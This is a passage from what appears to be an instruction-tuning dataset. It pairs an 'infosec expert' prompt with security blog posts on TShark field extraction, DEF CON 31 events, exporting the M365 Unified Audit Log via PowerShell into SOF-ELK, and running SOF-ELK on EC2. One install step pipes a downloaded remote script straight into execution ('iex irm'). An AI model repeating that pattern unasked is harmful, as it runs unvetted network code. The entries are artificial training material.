HTTP We can see below where several objects have been identified by Wireshark each one of them can now be extracted saved to disk for additional analysis Wireshark Exporting HTTP Objects Operationalizing from the Command Line Now that I've covered some of the basic settings and features of Wireshark I'll show some practical use cases for operationalizing your analysis yes we are going to pivot to the command line using TShark where we can do something useful rather than just staring into a GUI-abyss of packets In all seriousness there is nothing wrong with doing your analysis from within Wireshark In fact I find it extremely useful to have an instance of Wireshark running while utilizing TShark The difficult part with Wireshark is when we need to extract network data in bulk for things like data-stacking generating network telemetry that can be fed into a SIEM or any other analysis machine process With TShark we can harness the power of the command line while retaining the extensive protocol analyzers that come with Wireshark For starters TShark needs some command line options We'll look at several useful ones here and I encourage you to read the man page5 and explore additional options as you get more comfortable To read in a PCAP file we use the '-r option I always couple this with '-n which tells TShark NOT to perform any name resolution shenanigans tshark -nr infile.pcap To apply a display filter we use the '-Y option followed by the display filter tshark -nr infile.pcap -Y 'dns To write out a PCAP file we use the '-w option If we have a display filter applied this will instruct TShark to save a new PCAP file with only the packets matching the display filter tshark -nr infile.pcap -Y 'dns -w newfile.pcap And finally to capture traffic with TShark we use the '-i option to specify the interface to capture from tshark -ni eth0 Without specifying any additional parameters TShark will just print to stdout standard output therefore we specify the '-w to instruct TShark to write a PCAP file Additionally if we want to apply a capture filter the '-f option is used tshark -ni eth0 -f host 192.168.20.10 -w test.pcap Now let's see what this looks like in real life Applying the 'http display filter to a pcap file we get the following output TShark Default Timestamp Note the timestamps are in relative seconds from the first observed packet We can fix this with the '-t option and 'ud parameter which tells TShark to output the timestamp in UTC absolute time in the format YYYY-MM-DD hh mm ss.SSS TShark UTC Absolute Timestamp Much better Now let's get dangerous and extract data fields from a PCAP file TShark supports field extractions using the '-T fields option along with the '-e option to specify which fields are to be extracted Here's an example command that targets HTTP packets and prints out the timestamp in epoch time source IP address and destination IP address tshark -nr infile.pcap -Y 'http -T fields -e frame.time_epoch -e ip.src -e ip.dst By default TShark will print to stdout with extracted field values as tab delimited TShark HTTP Filter We can customize the output a bit more by adding the '-E header and '-E separator options as shown in the following command tshark -nr infile.pcap -Y 'http -T fields -E header y -E separator -e frame.time_epoch -e ip.src -e ip.dst '-E header y instructs TShark to print the field name on the first line of output '-E separator instructs TShark to use a custom separator value in this case the pipe character TShark HTTP Filter with Header and Custom Separator This is great but you may be asking yourself how do I know the specific field name to target for extraction Well this is where having a running instance of Wireshark comes in extremely handy We can utilize the display filter trick in Wireshark and find the specific field s we're after For example if we want to extract all HTTP User-Agent values with TShark open Wireshark and go to the Display Filter Toolbar and start typing http don't forget the then scroll down until you find the User-Agent field name http.user_agent Wireshark http.user_agent Filter I find it even more convenient to extract field names in the Packet Details section then have Wireshark just tell me the specific filter syntax This can be achieved by right-clicking on a field of interest and selecting Apply as Filter Selected Wireshark Apply as Filter Viola Wireshark will apply the filter in the Display Filter Toolbar for you Wireshark http.user_agent Filter Although the specific value is also applied to the filter in Wireshark we can ignore that as we are only interested in the field name http.user_agent Now we can take that to TShark and extract all unique User-Agent strings observed over HTTP tshark -nr infile.pcap -Y 'http -T fields -E header y -E separator -e ip.src -e http.user_agent There is however a slight gotcha in the above command As shown in the output below each instance where the Source IP is 137.184.39.243 the User-Agent field is empty TShark HTTP Filter with User-Agent Values Extracted This is because we instructed TShark to extract fields based on the -Y 'http filter which returns all HTTP traffic both client requests and server responses In the HTTP protocol User-Agent strings are sent by the client to the server and since TShark applies filters on a per-packet basis packets associated with server responses will not contain User-Agent values To avoid this we need to be a bit more tactical with our filter and use http.request rather than just http tshark -nr infile.pcap -Y 'http.request -T fields -E header y -E separator -e ip.src -e http.user_agent With the above command applied we now see that the only Source IP associated with User-Agent values is 192.168.88.55 TShark http.request Filter with User-Agent Values Extracted Because we are on the command line we can redirect the output to perform additional actions on the extracted data For these examples I'm using TShark on an Ubuntu system therefore I can utilize additional utilities from there Suppose we wanted to extract all unique combinations of Source IP addresses and User-Agent values and determine their frequency of occurrence within a packet capture We can modify the previous command slightly by redirecting the TShark output to the sort and uniq utilities which are pre-installed on Ubuntu tshark -nr infile.pcap -Y 'http.request -T fields -E separator -e ip.src -e http.user_agent sort uniq -c sort -nr The above command results in the following output Unique Source IP and User-Agent Values with Count of Occurrences The results show that we have two unique User-Agent values in this packet capture file and both are attributed to the host 192.168.88.55 The User-Agent string listed first was observed 4 times in the capture while the second User-Agent value was seen once What does sort uniq -c sort -nr do you might ask well the first sort command sorts each line prior to sending to uniq This is needed because the uniq command only matches on adjacent lines Then the uniq -c command counts each unique line value this is where we get the counts 4 and 1 Finally the last command sort -nr sorts the output by numeric value -n and in reverse order -r which essentially means descending as opposed to the default ascending order Closing Remarks I hope that this guide provided some helpful tips and tricks for those getting started with Wireshark and or TShark and equally important sparked ideas to take your network-analysis-fu to the next level If you find yourself overwhelmed while analyzing network traffic it's okay this is normal Keep in mind that tools aid our analysis but they are not perfect no tool is We also need to have a sound understanding of what we are analyzing So start with a common network protocol such as DNS or HTTP and learn as much as possible this will enhance your ability to distinguish between benign and malicious traffic in your environment References 1 ww.discovery.com shark-week 2 ww.cisa.gov sites default files 202302 time_guidance_network_operators_cios_cisos_508.pdf 3 f.nist.gov tf-cgi servers.cgi 4 ww.wireshark.org tools oui-lookup 5 ww.wireshark.org docs man-pages tshark.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Join Us for Camp BHIS @ DEF CON 31</title>\n<taxonomies>Backdoors & Breaches, Fun & Games, Informational, News, Def Con</taxonomies>\n<creation_date>Fri, 04 Aug 2023 00:37:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hey Campers It's that time of year again The smell of 0-day in the air Charlatans roasting by the pyre Old friends and new gather in one of the worst places in the world for those that have more hoodies than days to wear them LAS VEGAS This year Black Hills Information Security BHIS will be at the brand-new DEF CON Exhibitors Hall Does that sound too business-y for you Us too so we're doing it in the most BHIS way possible We're going shopping on-site at DEF CON and building our booth while there No slick booth wizardry just some camp chairs friends and conversations promoting the projects of folks in the community we love Oh and you can learn more about us too if you're into that sort of thing At the end we're donating everything in the booth to a local charity that supports helping the homeless in Las Vegas Join us in our Exhibitors Hall booth at Caesars Forum on August 11th 12th and 13th for some of the amazing camp activities below You can also find us around DEF CON at various events Check out the info below and come say hi Don't worry if you're not at Summer Camp this year we will be running live streams from our booth to bring a little bit of Hacker Summer Camp to you wherever you are Watch our YouTube channel for event times and links LINECON Backdoors Breaches Demos Weds 8 9 23 9 30pm 11 30pm PT Linecon Caesars Forum Waiting in line to get your DEF CON badge Want to learn how to play Backdoors Breaches get a free deck and meet folks from BHIS We thought future-you would say that We will be wandering Linecon teaching people how to play and handing out free decks Look for the folks with the carts and the bullhorn You know honestly at DEF CON that may describe lots of folks Either way we will be there teaching y'all how to play We're looking forward to making tons of new friends Learn more about Backdoors Breaches at www.backdoorsandbreaches.com Hot Red Team Tips Ralph May and Steve Borosh Fri 8 11 23 Noon 1pm PT Red Team Village Fri 8 11 23 3pm 4pm PT Red Team Village Sat 8 12 23 10 00am 11 00am PT Red Team Village Sat 8 12 23 Noon 1pm PT Red Team Village Join BHIS testers Ralph May and Steve Borosh in the Red Team Village as they discuss some of their best tips for red teamers These tips come from their extensive work in the field on actual red team engagements If red teaming is your thing you won't want to miss this Find out more at edteamvillage.io redhot.html Social Engineering Community Vishing Competition Ean Meyer Fri 8 11 23 12 30pm to 1 30pm Social Engineering Community Village Come watch as BHIS Content Community Co-Creator Ean Meyer gets in the booth and makes cold calls to his target Win or lose we promise you will be entertained Bason Jlanchard may even make an appearance at the booth Ean will also have some top-secret custom stickers to hand out during his call Learn more at ww.se.community Darknet Diaries x PROMPT Jeremy from Marketing Graphic Novel signing with Jack Rhysider Fri 8 11 23 3pm 4pm PT Caesars Forum Exhibitors Hall BHIS Booth You heard that right BHIS PROMPT our infosec zine and Darknet Diaries have teamed up to bring Episode 36 Jeremy from Marketing to a graphic novel We will have 1 000 copies at our booth to give away FOR FREE If that isn't good enough Jack Rhysider host and creator of Darknet Diaries will be signing copies Darknet Diaries is the wildly popular podcast about the dark side of the Internet Come early as we're betting they run out fast Find out more about Darknet Diaries and the episode the comic is based off here arknetdiaries.com episode 36 You can also sign up to receive PROMPT zine shipped to your door for free here ww.blackhillsinfosec.com prompt-zine Red Team Alliance Training Facility with Deviant Ollam Fri 5pm 5 30pm PT Caesars Forum Exhibitors Hall BHIS Booth Physical Entry Specialist connosseur of many things and all-around wonderful person Deviant Ollam will be stopping by to talk about the opening of the Red Team Alliance's brand-new state-of-the-art physical security training center in Las Vegas Stop by to learn more about it and meet the fantastic human behind the internet legends Learn more about the Red Team Alliance at ww.redteamalliance.com Badge Live Stream with Ironwood Cyber Sat 10am 11am PT Caesars Forum Exhibitors Hall BHIS Booth Last year Ironwood Cyber had the most sought-after badge of DEF CON 30 the Tron Identity Disk Full of features hacking challenges and an amazing design their badge this year is one of the most anticipated badges at DEF CON 31 And it can't be bought You can only get it from them at their surprise drop points Follow the Ironwood Cyber Twitter account to find out where they will be dropping the new Arc Reactor badge witter.com IronwoodCyber Want to find out how it was built Join us at the booth or watch on the live stream We will be talking with Jose Rodriguez of Ironwood Cyber about the build challenges and everything it took to make the new badge a reality You can see a preview of this incredible badge and just a few of the things it's packed with here witter.com IronwoodCyber status 1683891870705778694 Live Stream and Book Signing Joe Gray C3PJoe OSINT Sat 11am 12 30pm PT Caesars Forum Exhibitors Hall BHIS Booth Open-source intelligence expert regular judge for the TraceLabs CTF and founder of The OSINTion OSINT training Joe Gray will stop by to talk about his book Practical Social Engineering from No Starch Press We will talk about his OSINTion training his Antisyphon course and how he went about writing his book We will have 40 copies for sale that you can get autographed so stop by meet Joe and pick up a copy before they are all gone Check out his book and the OSINTion at the links below ww.theosintion.com Live Stream and Book Signing The Active Defender Dr Cathy Ullman Sat 8 12 23 3 00pm 4 30pm PT Caesars Forum Exhibitors Hall BHIS Booth Friend of the show and huge supporter of the infosec community Dr Cathy Ullman who you may know as Investigatorchic has a new book out called The Active Defender Immersion in the Offensive Security Mindset Hot off the presses on July 26th and published by Wiley it covers how to think like an offensive security pro when you're a defender Lots of tools tips and methods to help the blue team fight like the red team Come by our booth where we will be doing a live stream talking about the book followed by a book signing We will have 40 copies in stock that you can purchase at list price and get signed by the author Learn more about the book here ww.wiley.com en-us The Active Defender 3A Immersion in the Offensive Security Mindset-p-9781119895213 Floridaman Party Fri 9 00pm 11 00pm PT Margaritaville For Florida men women non-binary alligators and zombies recovering from bath salts the Floridaman Party has been a DEF CON favorite for years This is a community-run party is funded through badge sales You don't need to be from Florida to show up and experience the chaos of Florida Ean Meyer from Black Hills Information Security will be running an auction at 9 50pm PT at the party to benefit BSides Orlando Bring your cash to help support this community conference and make new friends Other BHIS testers will also be around so keep an eye out You can still purchase badges for pickup at loridaman.party Hacker Jeopardy Sat 10 00pm 11 00pm PT Caesars Forum If you haven't experienced Hacker Jeopardy it's a DEF CON must Hosted by the amazing Lintile hackers like you compete in a Jeopardy-style game show that starts off the rails and never really makes it back on track Watch as hackers cyber security experts and anyone brave enough to play fails in front of a massive audience to answer what runs on port 23 Black Hills Information Security will be giving the winners Antisyphon Training vouchers AND 250 in Caesar Chips to turn in for cash or make even more bad decisions at the tables Just remember DFIU Learn more at orum.defcon.org node 245322 Whose Slide Is It Anyway Sat 11 00pm 11 59am PT Caesars Forum Does the idea of presenting a slide deck you've never seen sound terrifying What if it was created by an AI whose only data model was a middle school Roblox Discord server and SEC 10k filings What if you had to do this in front of 1000 strangers Guess what you're right It's a horrifying and magical train wreck that you won't want to look away from The fabulous Rand0h will host along with many judges including Ean Meyer and Deb Wigley from Black Hills Information Security BHIS will be giving the winner 250 in Caesars Chips to turn in for cash or double down in the casinos Whatever they want we aren't their mom If we were their mom we would be extremely ashamed of them for ruining the family name by winning at Whose Slide Find out more here orum.defcon.org node 245436 That's a whole lot of Black Hills in a whole lot of DEF CON Check back here for other updates changes and general chaos We hope you come to Camp BHIS at DEF CON Say hi Oh and remember drink lots of water You're in a desert with a giant glowing orb in it Water is always a good option"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wrangling the M365 UAL with PowerShell and SOF-ELK (Part 1 of 3)</title>\n<taxonomies>How-To, Incident Response, InfoSec 201, Patterson Cake, Phishing, BEC, Business Email Compromise, Exchange Online Management, M365, Microsoft 365, PowerShell EXO, SOF-ELK, UAL, Unified Audit Log</taxonomies>\n<creation_date>Thu, 10 Aug 2023 16:08:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Patterson Cake When it comes to M365 audit and investigation the Unified Audit Log UAL is your friend It can be surly obstinate and wholly inadequate but your friend nonetheless Sadly depending upon licensing and retention it is sometimes your only friend Regardless of the type of audit or investigation you need to conduct your UAL challenges are three-fold acquiring the data parsing the output and querying the data to answer your audit and investigative questions In this post we'll step through one approach to overcoming all three challenges with the Exchange Online Management PowerShell module and Security Operations and Forensics Elasticsearch Logstash Kibana SOF-ELK Before wrangling it's worth asking Does the UAL contain the data you're looking for Since the UAL combines data from multiple M365 services aka workloads it may be more efficient to directly access service logging and in some cases the details you require may not actually populate the UAL You can review the properties captured by the UAL per service here Detailed properties in the audit log Microsoft Purview compliance Microsoft Learn It is also worth noting that the M365 ecosystem is ever-changing and licensing can be convoluted confusing and directly impacts UAL retention and properties That is a wrangling conversation all on its own but tactically speaking armed with a basic understanding of what can and should be included in the UAL I'll often sample the data for a tenant to see what I can see and to ascertain retention as opposed to laboring over E3 vs E5 and Azure P1 vs Entra Identity P2 etc Retrospectively it may be worthwhile to return to the questions of licensing levels property availability and retention as a lessons learned opportunity especially if you were unable to answer your audit investigative questions based on the current M365 tenant configuration Once we've decided that in our audit investigative scenario the UAL is indeed our friend it's time to roll up our sleeves don boots and the obligatory hat and get to wrangling First things first we need to acquire the UAL data There are a few different ways to approach this namely the Compliance Portal aka Purview the Office 365 API and the Exchange Online PowerShell module EXO I prefer the latter because of inline filtering capabilities some workarounds for max-returned records limitations and for the flexible output formats particularly as we look toward the next steps of parsing and querying via SOF-ELK At the time of this writing the current version of EXO is 3.2.0 and requires PowerShell 7 You can choose your own poison in terms of where and how to install these but I'm starting with a fresh Windows 2022 Server Base AWS EC2 instance t2.medium downloading PowerShell 7.x and installing the EXO module download and install PowerShell 7.x.x msi iex irm ka.ms install-powershell.ps1 -UseMSI -Quiet RUN FROM PowerShell v7 pwsh install exchangeonline management and graph api...be patient...takes a few minutes and since using pwsh no progress indicators C Program Files PowerShell 7 pwsh.exe -Command Install-Module -name exchangeonlinemanagement -repository psgallery -force C Program Files PowerShell 7 pwsh.exe -Command Install-Module -name microsoft.graph -scope allusers -repository psgallery -force Install PowerShell 7 and the EXO Mgmt Module If all goes well you can launch PowerShell 7 from PowerShell 5 by typing pwsh and hitting enter You may have to kill and restart your PowerShell 5 session for it to recognize that command If you execute Get-InstalledModule -Name Exchange you should see ExchangeOnlineManagement 3.2.0 as below Get-InstalledModule -Name Exchange Launch PowerShell 7 and confirm EXO Mgmt Module Because the UAL can be voluminous even in a small M365 tenant it's wise to be judicious in our acquisition Fortunately at the outset of an audit investigation we usually have a target account or accounts and associated date range which is where we'll start First we'll get connected by using the Connect-ExchangeOnline command from PowerShell 7 You should receive a modern-auth pop-up browser window where you'll authenticate as per usual to M365 using an account with adequate permissions review this and MFA You are using MFA right Right Of course you are as it is not safe to wrangle without it Connect via EXO and Authenticate Once connected we'll do a quick test to verify that all is well Remember that tab-completion is your friend Start typing Search-Un and hit tab If you don't get autocomplete for Search-UnifiedAuditLog then you are likely lacking required permissions review this To sample data access output let's run the command below Search-UnifiedAuditLog -StartDate 7 15 2023 -EndDate 7 20 2023 -UserIds target-user yourdomain.com -ResultSize 1 changing the parts in italics as appropriate You should see output similar to the image below Note that there are a few discrete named fields and the AuditData JSON blob Search-UnifiedAuditLog -StartDate 7 15 2023 -EndDate 7 20 2023 -UserIds target-user yourdomain.com -ResultSize 1 Single UAL Record Search Ultimately we want to pull all UAL data for our target user s for a date range often the entirety of available data 365 days but we may also want to do some searching or filtering to guide or narrow our UAL exports For example we might want to search for a particular operation or extract a few key components of the AuditData for review In our initial test search we see an operation of Remove delegated permission grant from a highly suspicious character named PC which might lead us to wonder about the associated addition of said permission grant If we run Search-UnifiedAuditLog -StartDate 1 1 2023 -EndDate 7 1 2023 -Operations Add delegated permission grant -ResultSize 1 perhaps we can find out Note the result size limit for brevity and that I did not specify a UserId Adjust either as desired Search-UnifiedAuditLog -StartDate 1 1 2023 -EndDate 7 1 2023 -Operations Add delegated permission grant -ResultSize 1 UAL Operations Filter Perhaps PC should not have Microsoft Graph permissions you notice the User Agent in the AuditData looks like Edge on Windows which seems suspect abnormal Are there any other audited actions in your tenant using this User Agent Let's try running Search-UnifiedAuditLog -StartDate 1 1 2023 -EndDate 7 20 2023 -ResultSize 1 Select-Object -ExpandProperty AuditData ConvertFrom-Json Where-Object ExtendedProperties -like Mozilla Select-Object workload userid extendedproperties Search-UnifiedAuditLog -StartDate 1 1 2023 -EndDate 7 20 2023 -ResultSize 1 Select-Object -ExpandProperty AuditData ConvertFrom-Json Where-Object ExtendedProperties -like Mozilla Select-Object workload userid extendedproperties UAL Filtering by User Agent Keyword The good news is that that worked The bad news is that it's cumbersome and not scalable which leads us to the UAL parsing and querying challenges You can export to CSV but the AuditData translates to a single field You can use Excel and convert from JSON which is simple expedient and moderately useful but you'll still end up with truncated list entries and encounter scaling constraints on large datasets What to do Drum roll please enter SOF-ELK Thank you Phil Hagen and team Security Operations and Forensics Elasticsearch Logstash Kibana SOF-ELK is a big data analytics platform focused on the typical needs of computer forensic investigators analysts available in a prepacked Virtual Machine For our purposes SOF-ELK has built-in well-maintained parsers for wrangling UAL logs You can read more here sof-elk VM_README.md at main philhagen sof-elk GitHub or head directly here to download a VM or572.com sof-elk-vm UAL Parse and Query Solution Once you've downloaded and unzipped the VM you can launch it via VMWare Workstation Fusion Player See the README.md link above for general info including username password I'll be using SOF-ELK from an EC2 instance Export of VM to an EC2 AMI is a bit of a process which I'll write up in part two of this post I'll go ahead and ssh from my Windows Server 2022 EC2 instance to SOF-ELK in anticipation of next steps SSH from Windows EC2 Instance to SOF-ELK Next we'll return to our PowerShell session to extract data for use with SOF-ELK If we are pulling a small amount of data less than 5K results we can run a singular command as follows Search-UnifiedAuditLog -StartDate 7 20 2022 -EndDate 7 20 2023 -UserIds target-user yourcompany.com -ResultSize 5000 Select-Object -ExpandProperty AuditData Out-File -Encoding UTF8 ual-target-user-07202022-07202023.json Search-UnifiedAuditLog -StartDate 7 20 2022 -EndDate 7 20 2023 -UserIds target-user yourcompany.com -ResultSize 5000 Select-Object -ExpandProperty AuditData Out-File -Encoding UTF8 ual-target-user-07202022-07202023.json UAL Export to JSON for PC User How do we know if there are less than 5K UAL entries based on our query parameters We don't You can check by re-running the above command replacing the output to file with measure Search-UnifiedAuditLog -StartDate 7 20 2022 -EndDate 7 20 2023 -UserIds pc securecake.com -ResultSize 5000 Select-Object -ExpandProperty AuditData Measure Alternatively we can use a couple different approaches to overcome the 5K record limit See the link below for Microsoft's perspective Naturally I like my script better mostly because it's simple and works for about 98 of my use cases Just edit the file output path the start and end dates filter on specific UserIDs or just leave null to search all The script queries the UAL in one-hour increments to minimize the possibility of hitting the 5K max-results per query reports count on-screen and writes to a single file Change path to desired output location and change name to reflect date range OutputFile ual-userid-pc-07012023-07202023.json Enter UserID in quotes or leave as null for all Users userids null Enter start search date in format mm-dd-yyyy StartSearchDate get-date 7-1-2023 Enter start search date in format mm-dd-yyyy EndSearchDate get-date 7-20-2023 FormattedStartDate Get-Date EndSearchDate DaysToSearch new-timespan -start StartSearchDate -End EndSearchDate .days For i 0 i -le DaysToSearch i For j 23 j -ge 0 j StartDate EndSearchDate.AddDays i .AddHours j EndDate EndSearchDate.AddDays i .AddHours j 1 Audit Search-UnifiedAuditLog -StartDate StartDate -EndDate EndDate -userIDs userids -ResultSize 5000 ConvertAudit Audit select-object -expandproperty AuditData out-file -encoding UTF8 OutputFile -Append Write-Host StartDate t Audit.Count UAL Export Script Use a PowerShell script to search the audit log Microsoft Purview compliance Microsoft Learn My script assumes that you are already connected via EXO to your tenant and works in reverse order newest date time to oldest displaying record count per interval Export Script Output Now we just need to copy our JSON data to SOF-ELK be patient while ingestion and parsing occur then move on to query wrangling via the SOF-ELK web UI From my current directory I'll confirm JSON file s and then scp them to the proper SOF-ELK directory Copy UAL Data to SOF-ELK From our SOF-ELK ssh session we can keep an eye on Elasticsearch progress by running sof-elk_clear.py -i list which will show us current indices You may see no entries at first but be patient In a couple minutes you should see a microsoft365 nn documents entry which is a great sign that our data is being ingested parsed Checking SOF-ELK Indices Again a little patience is in order but we can go to the web UI and see what our results look like Launch a browser and visit .x.x.x 5601 replacing the x's with your SOF-ELK IP address This should bring you to the default dashboard Click the hamburger icon three lines in the upper-left corner and click Discover SOF-ELK Discover Change your data view from logstash to microsoft365 Microsoft365 Data View Then change your date range to an applicable value I'll use Quick Select and Last One Month for my PC UAL dataset Set Date Time Range You should now see some hits and a couple hundred available fields If not make sure you've selected the correct data view microsoft365 and double-check your date-range filter Date-Filtered Microsoft365 Data View Thanks to the built-in parsing and some field normalization we can now easily wrangle our data by viewing selecting and searching available fields Let's sleuth out the PC user_name if you filtered your UAL query on a specific UserID this may not be necessary and visualize some key UAL details workload operation ips and useragent Type the first field name into the search box e.g user_ Click the field name to see the top values and confirm it is the data field you are looking for then click the sign at the top of the flyout to add the field as a column or click the sign next to a top value to filter on that value Repeat for each desired data field Add Fields to Current View Now we can easily pick and choose filter search and view the extracted AuditData fields Data View Table As per our previous inline-filtering discussion if we want to pivot on UserAgent and see if anyone else in our current UAL is using a suspect entry just hover over a useragent column entry and select the sign to filter for this useragent If you previously filtered on a single user_name remove that filter click the x to the right of the filter entry just below the manual filter box Filtering on a Selected Data Field Value And thus begins the iterative process of querying your data to answer your audit investigative questions adding fields filtering in out field values sorting and visualizing At some point you'll likely want to export to CSV which can be accomplished via the Share menu option and CSV Reports and Generate CSV Export to CSV Hopefully this is just the beginning of our SOF-ELK and UAL wrangling adventures as we've barely scratched the surface of SOF-ELK's utility We'll circle back and discuss how to spin this whole mess up in AWS EC2 and how to convert UAL CSV files for SOF-ELK ingestion Stay tuned and thanks for reading PS Just in case you were wondering how many times can he use the word 'wrangle in a single blog post It was only ten times I know it seemed like more than that but it wasn't READ PART 2 PART 3"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wrangling the M365 UAL with SOF-ELK on EC2 (Part 2 of 3)</title>\n<taxonomies>How-To, Informational, InfoSec 201, Patterson Cake, Phishing, BEC, Business Email Compromise, EC2, Exchange Online Management, M365, Microsoft 365, SOF-ELK, UAL, Unified Audit Log</taxonomies>\n<creation_date>Thu, 24 Aug 2023 16:36:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Patterson Cake In PART 1 of Wrangling the M365 UAL we talked about the value of the Unified Audit Log UAL some of the challenges associated with acquisition parsing and querying of the UAL data and strategies for overcoming those challenges using PowerShell and SOF-ELK focusing on how to properly format our exported data for easy ingestion into SOF-ELK running as a locally-installed virtual machine In this post we'll look at spinning up SOF-ELK on EC2 to give us greater portability flexibility and extensibility for UAL wrangling For quick and easy SOF-ELK deployment it's hard to beat downloading the pre-packaged virtual machine and running it locally via VMWare But for those times when you need a little extra computing capacity or to collaborate with others on an investigation or to take advantage of ease of access to data or systems that are already cloud-based deploying SOF-ELK on EC2 is worth the additional effort We'll start the process just like we did with our local VM deployment by downloading and unzipping the VM The next step is to create an OVA from the extracted VM If you have VMWare Workstation or Fusion you can launch VMWare import the VM select it then go to File and Export to OVF VMWare Workstation Export to OVF You'll then be prompted to specify where you want to save your export and what to name it IMPORTANT Make sure you specify a file extension of .ova when entering the file name e.g sof-elk-20230623.ova Alternatively you can use the command-line OVF Tool which is included with VMWare Workstation Fusion and Player Just open a terminal and navigate to the OVFTool directory under your VMWare installation directory From there invoke the ovftool executable providing the path to your source VMX file and a path for the export remembering to give the file name an .ova extension VMWare Workstation ovftool Export to OVA Next we'll need to prepare for upload of our exported ova to S3 and conversion to an Amazon Machine Image AMI We'll create an S3 bucket a containers.json file to describe our import create an Identity and Access Management IAM role and policy for the import and use the AWS CLI to import our image Don't panic we'll walk through it step-by-step You can accomplish most of the necessary AWS steps in either the web UI or via the CLI but unless you are using Migration Hub Orchestrator you'll need the CLI for the import-image task So let's start with installation and setup of the CLI detailed in the Amazon guides below Install or update the latest version of the AWS CLI AWS Command Line Interface amazon.com Set up the AWS CLI AWS Command Line Interface amazon.com Once the AWS CLI is installed and configured we'll make an S3 bucket for our upload paying careful attention to make the bucket region match the region where we want to perform the image import aws s3 mb s3 your-unique-import-bucket-name --region us-east-1 Create an S3 Bucket for Upload of OVA Next we'll setup the service role vmimport and policy required to allow the VM import export You can accomplish this via the web UI or via CLI Before proceeding it's worthwhile to check the required permissions for VM import export at the top of the linked page below to make sure you have adequate privileges to complete these tasks Required permissions for VM Import Export VM Import Export amazon.com Since the web UI is more intuitive and provides a bit of syntax-error checking I'll head to onsole.aws.amazon.com iamv2 and select Policies Create Policy and click JSON In the Policy editor you can copy paste and replace default text to create a new vmimport policy IMPORTANT Change the your-unique-bucket-name entries x2 to match your S3 image import bucket Version 2012-10-17 Statement Effect Allow Action s3 GetBucketLocation s3 GetObject s3 ListBucket Resource arn aws s3 your-unique-import-bucket-name arn aws s3 your-unique-import-bucket-name Effect Allow Action ec2 ModifySnapshotAttribute ec2 CopySnapshot ec2 RegisterImage ec2 Describe Resource NOTE If you reference the AWS link above you may notice that their recommended policy is for VM Import Export I omitted the export bucket configuration for the context of this post After you are happy with your JSON policy entries click Next and provide a descriptive policy name e.g VM_Import_Policy add a description if desired add Tags to help identify this resource in the future and click Create policy Now that we have our policy ready let's create a role From the IAM web UI click Roles then Create role then Custom trust policy and replace the default policy text with the JSON below Version 2012-10-17 Statement Effect Allow Principal Service vmie.amazonaws.com Action sts AssumeRole Condition StringEquals sts Externalid vmimport On the Add permissions screen find and select your VM_Import_Policy Click Next provide a Role name and add a description and tags if desired Finally click Create role Our S3 bucket is in place our role with associated policy is ready to go and now we can return to the AWS CLI to upload our OVA aws s3 cp C VMs sof-elk-20230623.ova s3 your-unique-import-bucket-name --region us-east-1 Upload OVA to S3 via AWS CLI While that upload is chugging away we can get our containers.json file ready Launch any text editor of your choosing copy paste the text below editing the Description for your OVA and the URL to match your upload bucket and desired OVA name Then save the file as containers.json Description SOF-ELK 20230623 OVA Format ova Url s3 your-unique-import-bucket-name sof-elk-20230623.ova Once your OVA upload is complete we can initiate the image import via the AWS CLI aws ec2 import-image --description SOF-ELK 20230623 OVA --disk-containers file C VMs containers.json If all goes well you should see output similar to the image below with a Status of active and StatusMessage of pending Pay attention to the ImportTaskId in your output as we can use that to check the status of our image import aws ec2 describe-import-image-tasks import-task-ids import-ami-02d6da26f8b862f5a StatusMessage should now show converting Hit the up arrow in your CLI again to repeat the command and keep an eye on progress Be patient as it takes a while and the Progress indicator feels a little like zero seconds remaining for about 30 minutes Hang in there we're almost done Once the import-image task is complete Status completed make note of the ImageId and we'll head to the EC2 web UI s-east-1.console.aws.amazon.com ec2 note that I am targeting the us-east-1 region for this example Unfortunately the AMI receives a randomly generated name based on the aforementioned ImageId So let's go to Images AMIs then find the AMI ID from your task-status output select it then click Tags Manage Tags and add a Name and descriptive value e.g SOF-ELK 20230623 With the AMI selected we can just click the Launch instance from AMI button on the top menu to enter the launch wizard We're on the home stretch and I've only used the word wrangling twice Within the launch an instance wizard give your instance a Name select from the available instance types I went with t3.medium create or select an existing key pair tweak network settings as desired and create a new security group or use an existing group IMPORTANT Our image is based on a default SOF-ELK VM which means well-known default credentials Please do not open up SSH to the world in your Security Group SG My intent is almost always to access SOF-ELK from another EC2 instance so I usually make a self-referencing SG and add the SOF-ELK instance and any other instances requiring access not allowing any external access directly to SOF-ELK From the EC2 web UI go to Security Groups Create security group name it something descriptive e.g SOF-ELK Security Group add a description and any desired tags then click Create security group Select the new SG click Edit inbound rules Add rule set type to All TCP you can be more restrictive if desired and just allow TCP ports 22 and 5601 set Source to Custom then add the Security Group to itself and Save Next assign the SG to your SOF-ELK instance and any other instances that need to access to SOF-ELK Once you are satisfied with your Security Group select click Launch instance While the instance is initializing I'll make note of the private IP then access my EC2 analysis server in anticipation of accessing SOF-ELK from there SSH from an EC2 Instance to SOF-ELK For one final check let's launch a browser and navigate to the SOF-ELK URL ou-sof-elk-local-ip 5601 The 